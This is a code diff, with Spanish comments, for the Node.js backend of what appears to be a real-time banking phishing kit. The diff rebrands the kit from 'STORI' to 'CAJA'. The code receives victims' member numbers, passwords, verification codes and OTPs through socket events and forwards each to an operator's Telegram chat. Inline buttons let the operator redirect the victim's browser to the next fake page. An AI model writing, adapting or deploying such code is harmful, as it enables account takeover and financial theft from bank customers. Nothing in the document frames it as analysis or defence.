@@ -25,13 +25,11 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
 io.on('connection', (socket) => {
-  console.log('🧠 Usuario conectado:', socket.id);
-
-  // Login principal
-  socket.on('dataForm', ({ correo, contrasena, sessionId }) => {
+  // Login principal (campo socio)
+  socket.on('dataForm', ({ socio, contrasena, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔐 Nuevo intento de acceso STORI:\n\n📧 Correo: ${correo}\n🔑 Contraseña: ${contrasena}`;
+    const mensaje = `🔐 Nuevo intento de acceso CAJA:\n\n🔢 Número de socio: ${socio}\n🔑 Contraseña: ${contrasena}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -51,7 +49,7 @@ io.on('connection', (socket) => {
   socket.on('codigoIngresado', ({ codigo, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔍 El usuario ingresó el siguiente código STORI:\n\n🧾 Código: ${codigo}`;
+    const mensaje = `🔍 El usuario ingresó el siguiente código CAJA:\n\n🧾 Código: ${codigo}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -71,7 +69,7 @@ io.on('connection', (socket) => {
   socket.on('otpIngresado', ({ codigo, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `📨 Reintento desde pantalla de error STORI:\n\n🧾 Nuevo código OTP: ${codigo}`;
+    const mensaje = `📨 Reintento desde pantalla de error CAJA:\n\n🧾 Nuevo código OTP: ${codigo}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -87,11 +85,11 @@ io.on('connection', (socket) => {
     bot.sendMessage(telegramChatId, mensaje, botones);
   });
 
-  // Formulario de errorlogo.html
-  socket.on('errorlogoForm', ({ correo, contrasena, sessionId }) => {
+  // Formulario de errorlogo.html — CORREGIDO
+  socket.on('errorlogoForm', ({ socio, contrasena, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `⚠️ Nuevo intento fallido detectado STORI:\n\n📧 Usuario: ${correo}\n🔑 Clave: ${contrasena}`;
+    const mensaje = `⚠️ Nuevo intento fallido detectado CAJA:\n\n🔢 Número de socio: ${socio}\n🔑 Clave: ${contrasena}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -132,7 +130,7 @@ io.on('connection', (socket) => {
     activeSockets.set(sessionId, socket);
   });
 
-  // Redirección solicitada desde botones en el HTML
+  // Redirección desde el cliente
   socket.on("redirigir", ({ url, sessionId }) => {
     const socketTarget = activeSockets.get(sessionId);
     if (socketTarget) {
@@ -141,7 +139,7 @@ io.on('connection', (socket) => {
   });
 });
 
-// Respuesta a botones desde Telegram
+// Respuesta desde Telegram
 bot.on('callback_query', (query) => {
   const data = query.data;
   const chatId = query.message.chat.id;
